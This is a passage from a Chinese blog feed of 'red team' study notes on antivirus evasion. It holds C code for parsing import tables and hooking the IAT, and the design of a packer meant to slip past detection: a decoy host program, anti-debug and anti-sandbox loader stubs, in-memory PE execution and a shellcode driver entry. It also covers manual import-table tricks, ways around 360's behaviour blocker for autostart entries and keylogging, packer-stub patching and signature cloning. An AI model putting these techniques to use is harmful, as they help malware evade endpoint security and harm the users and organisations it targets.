IMAGE_SNAP_BY_ORDINAL32(Ordinal) ((Ordinal &amp; IMAGE_ORDINAL_FLAG32) != 0)    //判断最高位是否位1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>据此，便可以找到程序导入的所有的Dll文件名以及导入的相应函数，如下图。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1653138348044/0c9c62316d6548069eba606df5e40780.png" alt="image.png"></p><h2 id="RAT红队壳开发导入表完整代码（三）"><a href="#RAT红队壳开发导入表完整代码（三）" class="headerlink" title="RAT红队壳开发导入表完整代码（三）"></a>RAT红队壳开发导入表完整代码（三）</h2><p>在文件加载到内存中之前，INT和IAT所指的内容是一样的，都是指向保存了函数名地址。而在程序装载进内存的时候，操作系统会根据导入表的名称和导入函数的名称将正确的函数地址填入到IAT表中。</p><p>据此可以写出解析导入表的代码如下</p><pre class="line-numbers language-none"><code class="language-none">void PEParse::PrintImportTable(){    char *pDllName = NULL;    DWORD i = 0;    PDWORD pINT = NULL, pIAT = NULL;      if (this-&gt;pImportTable == NULL)    {        printf("the file doest have import table\n");        goto exit;    }     printf("=============Import Table Information===============\n");    while (this-&gt;pImportTable[i].OriginalFirstThunk != 0 ||            this-&gt;pImportTable[i].FirstThunk != 0)    {        pDllName = (char *)((DWORD)(this-&gt;pDosHead) + this-&gt;RVAToFOA(this-&gt;pImportTable[i].Name));        printf("The import Dll name is %s\n", pDllName);         printf("The INT Information:\n"); // get INT table        pINT = (PDWORD)((DWORD)(this-&gt;pDosHead) +                                     this-&gt;RVAToFOA(this-&gt;pImportTable[i].OriginalFirstThunk));        while (*pINT)        {            if (IMAGE_SNAP_BY_ORDINAL32(*pINT)) //the highest bit is 1?            {                DWORD dwOrder = *pINT &amp; ~IMAGE_ORDINAL_FLAG32; //clear highest bit                printf("The function order is %d\n", dwOrder);            }            else            {                PIMAGE_IMPORT_BY_NAME pFunName = (PIMAGE_IMPORT_BY_NAME)((DWORD)this-&gt;pDosHead + this-&gt;RVAToFOA(*pINT));                printf("The function name is %s\n", pFunName-&gt;Name);            }            pINT++;        }          printf("The IAT Information:\n"); // get IAT table        pIAT = (PDWORD)((DWORD)(this-&gt;pDosHead) + this-&gt;RVAToFOA(this-&gt;pImportTable[i].FirstThunk));        while (*pIAT)        {            if (IMAGE_SNAP_BY_ORDINAL32(*pIAT))        //the highest bit is 1?            {                DWORD dwOrder = *pIAT &amp; ~IMAGE_ORDINAL_FLAG32; //clear highest bit                printf("The function order is %d\n", dwOrder);            }            else            {                PIMAGE_IMPORT_BY_NAME pFunName = (PIMAGE_IMPORT_BY_NAME)((DWORD)this-&gt;pDosHead +                                                                    this-&gt;RVAToFOA(*pIAT));                printf("The function name is %s\n", pFunName-&gt;Name);            }            pIAT++;        }        i++;        printf("\n");    }    printf("=============Import Table Information===============\n"); exit:; }IAT HOOK代码：#include &lt;cstdio&gt;#include &lt;Windows.h&gt; typedef int (WINAPI *pFnMessageBox)(HWND, LPCSTR, LPCSTR, UINT); int WINAPI HookMessageBoxA(HWND hWnd,                           LPCSTR lpText,                           LPCSTR lpCaption,                           UINT uType); void IATHook();void UnIATHook(); DWORD dwOrgFuncAddr = 0; int main(){    MessageBox(NULL, TEXT("1900"), TEXT("Test"), MB_OK);    IATHook();    MessageBox(NULL, TEXT("1900"), TEXT("Test"), MB_OK);    UnIATHook();    MessageBox(NULL, TEXT("1900"), TEXT("Test"), MB_OK);    system("pause");     return 0;} void IATHook(){    PVOID pBaseAddr = (PVOID)GetModuleHandle(NULL); //获取进程的装载进内存的基地址    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBaseAddr;    PIMAGE_FILE_HEADER pFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pBaseAddr + pDosHeader-&gt;e_lfanew + 4);    PIMAGE_OPTIONAL_HEADER pOptionHeader = (PIMAGE_OPTIONAL_HEADER)((DWORD)pFileHeader + IMAGE_SIZEOF_FILE_HEADER);    PIMAGE_IMPORT_DESCRIPTOR pImportTables = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)pBaseAddr +        pOptionHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);    PDWORD pIAT = NULL, pINT = NULL;    PIMAGE_IMPORT_BY_NAME pFunName = NULL;     while (pImportTables-&gt;FirstThunk != 0 &amp;&amp; pImportTables-&gt;OriginalFirstThunk != 0)    {        pINT = (PDWORD)((DWORD)pBaseAddr + pImportTables-&gt;OriginalFirstThunk);        pIAT = (PDWORD)((DWORD)pBaseAddr + pImportTables-&gt;FirstThunk);        while (*pINT)        {            if (!IMAGE_SNAP_BY_ORDINAL32(*pINT))            {                pFunName = (PIMAGE_IMPORT_BY_NAME)((DWORD)pBaseAddr + *pINT);                if (strcmp((CONST CHAR*)pFunName-&gt;Name, "MessageBoxA") == 0)        //判断是不是要HOOK的函数                {                    dwOrgFuncAddr = *pIAT;    //获取原来的函数地址                    *pIAT = (DWORD)HookMessageBoxA;   //将我们的函数地址复制进去                    printf("Hook Ok\n");                    break;                }            }            pINT++;            pIAT++;        }        pImportTables++;    }}  void UnIATHook(){    PVOID pBaseAddr = (PVOID)GetModuleHandle(NULL);  //获取进程的装载进内存的基地址    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBaseAddr;    PIMAGE_FILE_HEADER pFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pBaseAddr + pDosHeader-&gt;e_lfanew + 4);    PIMAGE_OPTIONAL_HEADER pOptionHeader = (PIMAGE_OPTIONAL_HEADER)((DWORD)pFileHeader + IMAGE_SIZEOF_FILE_HEADER);    PIMAGE_IMPORT_DESCRIPTOR pImportTables = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)pBaseAddr +        pOptionHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);    PDWORD pIAT = NULL, pINT = NULL;    PIMAGE_IMPORT_BY_NAME pFunName = NULL;     while (pImportTables-&gt;FirstThunk != 0 &amp;&amp; pImportTables-&gt;OriginalFirstThunk != 0)    {        pINT = (PDWORD)((DWORD)pBaseAddr + pImportTables-&gt;OriginalFirstThunk);        pIAT = (PDWORD)((DWORD)pBaseAddr + pImportTables-&gt;FirstThunk);        while (*pINT)        {            if (!IMAGE_SNAP_BY_ORDINAL32(*pINT))            {                pFunName = (PIMAGE_IMPORT_BY_NAME)((DWORD)pBaseAddr + *pINT);                if (strcmp((CONST CHAR*)pFunName-&gt;Name, "MessageBoxA") == 0)        //判断是不是要HOOK的函数                {                    *pIAT = (DWORD)dwOrgFuncAddr; //将原来的函数恢复回去                    printf("UnHook Ok\n");                    break;                }            }            pINT++;            pIAT++;        }        pImportTables++;    }} int WINAPI HookMessageBoxA(HWND hWnd,    LPCSTR lpText,    LPCSTR lpCaption,    UINT uType){    pFnMessageBox pMessagaBoxFun = (pFnMessageBox)dwOrgFuncAddr;     pMessagaBoxFun(NULL, TEXT("Hooked"), TEXT("Success"), MB_OK);    pMessagaBoxFun(hWnd, lpText, lpCaption, uType);     return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.17-gai-ke-mian-sha-gao-ji-ji-qiao-er/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.17-gai-ke-mian-sha-gao-ji-ji-qiao-er/</url>
      
        <content type="html"><![CDATA[<h2 id="红队定制版的免杀壳核心原理（一）"><a href="#红队定制版的免杀壳核心原理（一）" class="headerlink" title="红队定制版的免杀壳核心原理（一）"></a>红队定制版的免杀壳核心原理（一）</h2><ul><li><strong>免杀壳核心思想-伪装</strong></li></ul><pre class="line-numbers language-none"><code class="language-none">经过10多年的发展，反病毒引擎已经在误报&amp;查毒粒度之间取了一个比较好的平衡，常规的免杀技术（特征码免杀、源码免杀）处理成本越来越高。不过反病毒引擎天然存在某些"缺陷"，例如正常软件会加商业保护壳，导致会受到商业壳的制约，无法将所有壳标记为病毒。由于内存执行"被加壳程序"是壳的基础行为，而内存执行PE这个"壳的基础行为"可以很好的将"被加壳程序"的特征码隐藏起来。因此编写一款无特征码壳是一个非常好的反杀软查杀(特征码、启发式)的方案。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>模拟正常PE程序结构, 模拟正常PE程序结构, 模拟正常PE程序结构</li><li>特征代码最小化，并且被查杀后可通过混淆引擎来混淆壳代码，达到快速变种、快速免杀的效果。</li><li>笔者不建议进行任何可能提高程序熵值的操作，尽可能将壳程序的PE格式、数据结构、代码执行顺序与正常程序保持一致。</li><li><strong>免杀壳的编写框架说明</strong></li></ul><pre class="line-numbers language-none"><code class="language-none">这个免杀壳的代码主要分为三部分：<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>加壳器：这部分代码用来将被加壳程序、傀儡程序、壳代码拼装处理，组合生成一个免杀的PE文件。</p><p>CodeLoader（壳代码）：这部分代码用来反杀毒引擎、内存加载执行PeLoader，需要编译为Shellcode代码。</p><p>PeLoader（壳代码）：这部分代码用来内存执行Shelled（被加壳程序），需要编译为Shellcode代码。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1652885304064/a827dfa72f61400bb507cdc12ae4ed60.png" alt="image.png"></p><h2 id="红队定制版的免杀壳核心原理（二）"><a href="#红队定制版的免杀壳核心原理（二）" class="headerlink" title="红队定制版的免杀壳核心原理（二）"></a>红队定制版的免杀壳核心原理（二）</h2><ul><li><strong>专业结构术语</strong></li></ul><p>Ø  Shelled：被加壳程序</p><p>Ø  Pepput：傀儡程序，用来伪装成正常PE文件，植入壳代码的载体</p><p>Ø  CodeLoaderCode：壳代码</p><p>Ø  PeLoaderCode：壳代码</p><p>Ø  CodeLoader：作用是反调试、反沙箱(虚拟机)、加载执行PeLoader(只有这段代码暴露在杀毒引擎的检测范围之内，只需要对这段代码做混淆即可快速免杀)</p><p>Ø  PeLoader：作用是加载执行Shelled（被加壳程序）</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1652885304064/6fb8f3a4bdb14dedb4d2eb35f2fb1d28.jpg" alt="image.png"></p><ul><li><strong>写壳的注意事项</strong></li></ul><ol><li>最核心的就是伪装，完全模拟正常PE程序。</li><li>壳代码没有异常行为，不触发杀软的检测规则。</li><li>傀儡文件的OEP代码尽量避免影响被加壳程序的正常执行</li><li>核心功能为减少暴露面，提高做免杀的速度</li><li>通过混淆引擎混淆壳代码，达到混淆后无特征代码。</li><li>支持壳上壳，通过加其他VM壳处理内存特征码、反分析。</li></ol><h4 id="红队免杀壳开发框架之隐藏输入表重定位（三）"><a href="#红队免杀壳开发框架之隐藏输入表重定位（三）" class="headerlink" title="红队免杀壳开发框架之隐藏输入表重定位（三）"></a>红队免杀壳开发框架之隐藏输入表重定位（三）</h4><pre class="line-numbers language-none"><code class="language-none">//获取导出表的转发函数计数long   __stdcall  GetExprotExModuleFuncName(PIMAGE_DOS_HEADER Module,WIN_MEM_PE PeDataType){PIMAGE_EXPORT_DIRECTORY  ExprotDir = GetExprotDir(Module,PeDataType);ULONG                    Count,i,OutCount = 0;PULONG                   AddressOfFunctions;do{if((NULL == ExprotDir) || (-1 == (long)ExprotDir)){break;}Count              = ExprotDir-&gt;NumberOfFunctions;AddressOfFunctions = (PULONG)ExprotDir-&gt;AddressOfFunctions;if((0 == ExprotDir-&gt;Name)|| (0 == AddressOfFunctions) || (0 == Count)){break;}AddressOfFunctions = (PULONG)GetRVARunAddr(Module,(ULONG)AddressOfFunctions,PeDataType);if((NULL == AddressOfFunctions) || (-1 == (long)AddressOfFunctions)){break;}for(i = 0; i &lt; Count; i++){if(AddressOfFunctions[i]){if(!TestRvaInExport(Module,AddressOfFunctions[i])){OutCount++;}}}break;}while(0);return OutCount;}//测试导出表是否存在RVA异常long   __stdcall  TestExprotRvaError(PIMAGE_DOS_HEADER Module,WIN_MEM_PE PeDataType){PIMAGE_EXPORT_DIRECTORY  ExprotDir = GetExprotDir(Module,PeDataType);ULONG                    Rva,Count,i;PULONG                   AddressOfFunctions,AddressOfNames,AddressOfNameOrdinals;do{if(NULL == ExprotDir){break;}if(-1 == (long)ExprotDir){return 0;}Count                 = ExprotDir-&gt;NumberOfFunctions;AddressOfFunctions    = (PULONG)ExprotDir-&gt;AddressOfFunctions;AddressOfNames        = (PULONG)ExprotDir-&gt;AddressOfNames;AddressOfNameOrdinals = (PULONG)ExprotDir-&gt;AddressOfNameOrdinals;if(0 == Count){break;}if(0 == ExprotDir-&gt;Name){break;}if(NULL == AddressOfFunctions){break;}if(TestRvaError(Module,(ULONG)AddressOfFunctions)){return 0;}if(AddressOfNames &amp;&amp; TestRvaError(Module,(ULONG)AddressOfNames)){return 0;}if(AddressOfNameOrdinals &amp;&amp; TestRvaError(Module,(ULONG)AddressOfNameOrdinals)){return 0;}AddressOfFunctions = (PULONG)GetRVARunAddr(Module,(ULONG)AddressOfFunctions,PeDataType);if((-1 == (long)AddressOfFunctions) || (NULL == AddressOfFunctions)){return 0;}for(i = 0; i &lt; Count; i++){if(0 == (Rva = AddressOfFunctions[i])){return 0;}if(TestRvaError(Module,Rva)){return 0;}}Count = ExprotDir-&gt;NumberOfNames;if((0 == Count) || (0 == (long)AddressOfNames)){break;}if(0 == (long)AddressOfNameOrdinals){return 0;}AddressOfNames = (PULONG)GetRVARunAddr(Module,(ULONG)AddressOfNames,PeDataType);if((-1 == (long)AddressOfNames) || (NULL == AddressOfNames)){return 0;}AddressOfNameOrdinals = (PULONG)GetRVARunAddr(Module,(ULONG)AddressOfNameOrdinals,PeDataType);if((-1 == (long)AddressOfNameOrdinals) || (NULL == AddressOfNameOrdinals)){return 0;}for(i = 0; i &lt; Count; i++){if(0 == (Rva = AddressOfNames[i])){return 0;}if(TestRvaError(Module,Rva)){return 0;}}break;}while(0);return 1;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="红队免杀壳开发框架之shellcode入口（四）"><a href="#红队免杀壳开发框架之shellcode入口（四）" class="headerlink" title="红队免杀壳开发框架之shellcode入口（四）"></a>红队免杀壳开发框架之shellcode入口（四）</h4><pre class="line-numbers language-none"><code class="language-none">/壳程序的SYS入口函数long __stdcall ShellCodeSysMain(PVOID pDriverObject,PVOID pRegistryPath){if((NULL == pDriverObject) &amp;&amp; (NULL == pRegistryPath)){return -1;}ULONG  Rva;SYSMAIN                MainDriver = NULL;PIMAGE_DOS_HEADER      Module     = NULL;PIMAGE_BASE_RELOCATION BaseInfo   = NULL;PSHELLCODEINFO_BASE    pShellInfo = NULL;do{pShellInfo = (PSHELLCODEINFO_BASE)GetRunAddress(&amp;BaseShellInfo);if(0 == pShellInfo-&gt;ShellInfoRva){return -1;}Module     = (PIMAGE_DOS_HEADER)((ULONG)pShellInfo - pShellInfo-&gt;ShellInfoRva);MainDriver = (SYSMAIN)((ULONG)Module + pShellInfo-&gt;AddressOfEntryPoint);if(0 == pShellInfo-&gt;AddressOfEntryPoint){MainDriver = NULL;}if((0 == pShellInfo-&gt;DataDirectory[5].VirtualAddress) || (0 == pShellInfo-&gt;DataDirectory[5].Size)){break;}Rva      = pShellInfo-&gt;DataDirectory[5].VirtualAddress;Rva      = GetRVARunAddr(Module,Rva,IMAGE_DATA_PE);BaseInfo = (PIMAGE_BASE_RELOCATION)Rva;if((0 == Rva) || (-1 == Rva)){return -1;}OnModuleBase(Module,BaseInfo,IMAGE_DATA_PE);break;}while(0);if(MainDriver){return MainDriver(pDriverObject,pRegistryPath);}return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.16-gai-ke-mian-sha-gao-ji-ji-qiao-yi/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.16-gai-ke-mian-sha-gao-ji-ji-qiao-yi/</url>
      
        <content type="html"><![CDATA[<h2 id="免杀壳世界高级基础（一）"><a href="#免杀壳世界高级基础（一）" class="headerlink" title="免杀壳世界高级基础（一）"></a>免杀壳世界高级基础（一）</h2><ul><li><strong>传统壳基础方式：</strong></li></ul><p>1.壳的分类：压缩壳和加密壳<br>2.壳的作用：保护和文件免杀<br>二.加壳免杀的几个弱点<br>1.不能躲过像瑞星这类具有内存查杀功能的杀毒软件。<br>2.一般不能躲过卡巴的查杀<br>因为卡巴采用了一种叫虚拟机技术。首先把加了多层壳的<em>程序在虚拟机环境下运行一下<strong>，</strong>这样</em>程序就会现出本来面目，这样无论你加了多少层壳，在运行后程序还是要暴露自已的。所以大家在加壳测试过程中也会发现，能过其它的多种杀毒软件，但卡巴始终很难过，其原因就是卡巴的虚拟技术在作怪。<br>三.是不是现在的加壳免杀已失去意义<br>每种免杀技术都有他的缺点和优点，比如加壳，首先要找到比较生僻的壳,而且可能以后很快被查杀.同时也不能过内存查杀,也很难过卡巴.但它操作方便,通用性好加一个壳,可能过好几个杀毒软件.又比如修改特征码.首先操作比较烦,要定位,要修改,改好后还要测试是否能正常使用.同时针对性非常强.只能针对某一种杀毒软件的免杀,各种杀毒软件的特征码都不一样,所以要躲过多种杀毒软件查杀,就要分别定位,修改每种杀毒软件的特征码.这样是相当麻烦的.但它可以通过修改特征码来躲过瑞星内存和卡巴的查杀.<br>所以以后免杀技术会把加壳,加花指令,改入口点,改特征码这几种方法结合起来使用.对付瑞星的内存查杀,我们可以修改内存特征码,对付卡巴的虚拟机技术.我们可以修改卡巴的特征码.在加上加冷门壳,加花指令,改入口点.综合这些方法就可以打造金钢不死之身!<br>四.加壳免杀实例演示部分:<br>1.加生僻壳免杀:实例演示<br>2.加伪装壳免杀:实例演示<br>3.多重加壳免杀:（用MM彩衣进行多重加壳）</p><ul><li><strong>现今免杀壳的高级基础方式：</strong></li></ul><h2 id="1-1-基础知识"><a href="#1-1-基础知识" class="headerlink" title="1.1   基础知识"></a>1.1   基础知识</h2><p>1、编程语言：C/C++、ASM、Shellcode编程；</p><p>2、PE相关：熟悉PE结构（PE头、区段、IAT表、重定位表）；</p><p>3、其他： PE加载原理。</p><h2 id="1-2-免杀方法"><a href="#1-2-免杀方法" class="headerlink" title="1.2   免杀方法"></a>1.2   免杀方法</h2><p>Ø  针对传统的特征码匹配引擎、启发式引擎，常用的免杀方式如下：</p><p>²  特征码免杀法：最基本的免杀技术，不解释</p><p>²  通用免杀法：替换资源、增加签名、加冷门壳、加多重壳</p><p>²  源码免杀法：当前主流免杀技术，需要有源代码才能操作。通过修改病毒的特征字符串、动态API调用、修改编译环境、套程序外壳(MFC、SDK、QT)等</p><p>²  输入表(IAT)免杀法：启发式引擎会扫描目标程序的输入表中是否包含指定的函数特征序列(函数调用特征码)。</p><p>解决方案：(本段摘自未知作者)</p><p>1、 输入表函数移位法：输入这是最早也是比较简单的输人表免杀方法了，虽然效果已经不像当年那么好了，但却是学习免杀过程必须要掌握的基础知识。我们使用C32打开一个EXE文件，找到输入表段，找到我们定位出的特征输入表，比如ShellExecuteA就是，我们将其使用OO填充，然后在附近找到一片空白区域，将刚才找到的代码再粘贴到空白区域中，并记下新函数的地址，ShellExecuteA字符串最前面的那个“S”的地址减2，即00078925，这样就实现了转移，但是要想让程序知道我们转移的函数，我们还得告诉输入表，刚才那个地址是文件偏移地址，但不是内存地址，我们需要利用OC计算出新的输入表函数ShellExecuteA的内存位置，并在LoadPE中修改才行。</p><p>2、 输入表函数对调法：这个方法的原理就是将输入表函数名长度相同的函数在C32中进行对调，只有长度一样才不会出错，然后在LoadPE中做相应的修改即可。比如被查杀的函数是OpenFileA，存在于A.dll文件中，我们在b.dll中找到了一个GetATimeA函数，这两个函数名称长度一样，我们在C32中做了静态对换之后，还要将它们的RVA进行对换，操作很简单的，我就不演示了。</p><p>3、 手工重建输入表：关于输入表的重建，我想大家都非常熟悉了吧，这算是比较复杂的一种方法了，不过免杀效果非常好，这也是必须要掌握的方法哦！这个方法其实就是添加一个新区段，再把原来的输入表移到我们新建的区段上，重建主要是针对杀毒软件定位到大片输入表函数。</p><p>4、 输入表隐藏法：将输入表加密隐藏，然后内存解密修复输入表。属于保护壳常用的技术。</p><p>²  代码混淆、加花：通过对特征代码进行膨胀、乱序来干扰启发式引擎的分析，以及提升人工提取特征码的难度。</p><p>²  入口点模糊技术：参考”主要技术”目录下的”入口点模糊技术”</p><p>²  内存加载执行PE文件：壳的基本技术，论坛资料很多。</p><p>Ø  机器学习引擎（以360QVM为例），绕过方式如下：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1652709234084/fa26ae46054a45fd85970c6552b3f591.png" alt="image.png"></p><h2 id="免杀壳主动防御基础（二）"><a href="#免杀壳主动防御基础（二）" class="headerlink" title="免杀壳主动防御基础（二）"></a>免杀壳主动防御基础（二）</h2><p>Ø  主动防御：</p><pre class="line-numbers language-none"><code class="language-none">简介：主动防御是基于程序行为自主分析判断的实时防护技术，不以病毒的特征码作为判断病毒的依据，而是从最原始的病毒定义出发，直接将程序的行为作为判断病毒的依据。360主动防御模块经过做黑灰兄弟们的不懈努力，已经非常完善了，绝大部分常规、非常规的行为绕过方式均已被拦截，并弹出一个默认阻止的小框框。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>1、继续挖掘非常规方法绕过主防的拦截，主防未监控到的区域。</p><p>2、白程序(包含在杀软白名单库中的程序)加黑程序方式来执行高危行为，写启动项、键盘记录等。(不过要注意的是360白程序判定逻辑，灰程序加载的白程序 = 灰程序，因此需要绕过主防的程序执行链监控)</p><h2 id="红队实战-改壳免杀（三）"><a href="#红队实战-改壳免杀（三）" class="headerlink" title="红队实战-改壳免杀（三）"></a>红队实战-改壳免杀（三）</h2><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1652709234084/254a1984157647f99c006c984928933e.png" alt="image.png"></p><p>改壳之前：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1652709234084/c469aa1e71ce41d895b857f952b64851.png" alt="image.png"></p><pre class="line-numbers language-none"><code class="language-none">改壳之前的代码：0042916C &gt;  9C              pushfd0042916D    60              pushad0042916E    E8 00000000     call dan.0042917300429173    5D              pop ebp                                  ; kernel32.7C81707700429174    83ED 07         sub ebp,0x700429177    8D8D 10FFFFFF   lea ecx,dword ptr ss:[ebp-0xF0]0042917D    8039 01         cmp byte ptr ds:[ecx],0x100429180    0F84 42020000   je dan.004293C800429186    C601 01         mov byte ptr ds:[ecx],0x100429189    8BC5            mov eax,ebp0042918B    2B85 A4FEFFFF   sub eax,dword ptr ss:[ebp-0x15C]00429191    8985 A4FEFFFF   mov dword ptr ss:[ebp-0x15C],eax00429197    0185 D4FEFFFF   add dword ptr ss:[ebp-0x12C],eax0042919D    8DB5 18FFFFFF   lea esi,dword ptr ss:[ebp-0xE8]004291A3    0106            add dword ptr ds:[esi],eax004291A5    55              push ebp004291A6    56              push esi004291A7    6A 40           push 0x40004291A9    68 00100000     push 0x1000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>改壳之后：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1652709234084/567705828048484ab5082275fa1800a8.png" alt="image.png"></p><pre class="line-numbers language-none"><code class="language-none">改壳之后：00440000 &gt;  60              pushad00440001    33C0            xor eax,eax00440003    33DB            xor ebx,ebx00440005    61              popad00440006  - E9 6191FEFF     jmp 改壳后.0042916C0044000B    90              nop0044000C    0000            add byte ptr ds:[eax],al0044000E    0000            add byte ptr ds:[eax],al00440010    6c              ins byte ptr es:[edi],dx00440011    91              xchg eax,ecx00440012    0200            add al,byte ptr ds:[eax]00440014    0000            add byte ptr ds:[eax],al00440016    0000            add byte ptr ds:[eax],al<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="红队实战-改壳免杀之签名克隆（四）"><a href="#红队实战-改壳免杀之签名克隆（四）" class="headerlink" title="红队实战-改壳免杀之签名克隆（四）"></a>红队实战-改壳免杀之签名克隆（四）</h2><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1652709234084/cb3c0877f9d6403692ecb44e07231f8e.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1652709234084/442ab113dfc040fc82610accf4cc2c5d.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.15-kai-fa-gao-ji-ban-shellcode-jia-zai-qi-xia/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.15-kai-fa-gao-ji-ban-shellcode-jia-zai-qi-xia/</url>
      
